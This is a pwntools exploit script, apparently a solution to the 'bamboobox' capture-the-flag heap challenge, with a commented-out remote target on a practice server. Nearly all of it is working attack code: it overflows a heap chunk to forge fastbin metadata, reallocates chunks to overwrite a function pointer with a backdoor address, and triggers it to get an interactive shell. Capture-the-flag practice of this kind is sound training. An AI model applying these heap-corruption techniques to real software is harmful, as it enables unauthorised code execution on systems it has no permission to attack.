from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
p = process([ld_path, "./bamboobox"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
# p = remote("node4.buuoj.cn", 27458)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def show():
    sa("Your choice:", "1")

def add(length, con):
    sa("Your choice:", "2")
    sa("Please enter the length of item name:", str(length))
    sa("Please enter the name of item:", con)

def change(index, length, con):
    sa("Your choice:", "3")
    sa("Please enter the index of item:", str(index))
    sa("Please enter the length of item name:", str(length))
    sa("Please enter the new name of the item:", con)

def free(index):
    sa("Your choice:", "4")
    sa("Please enter the index of item:", str(index))


# this wp should work, but remote don't have "/home/bamboobox/flag"
# so we need wp_remote.py

# off by null + fastbin attack
back_door = 0x0400D49

# alloc to v4 in the program
add(0x10, "0")
add(0x10, "1")
add(0x10, "2")
free(1)
free(2)
pad = cyclic(0x10)+p64(0)+p64(0x21)
pad += p64(0)*2+p64(0)+p64(0x21)
change(0, len(pad), pad)

add(0x10, "1")
add(0x10, "2")

# overwrite v4 to back_door
pad = p64(back_door)*2
change(2, len(pad), pad)

# attack 
sa("Your choice:", "5")

shell()


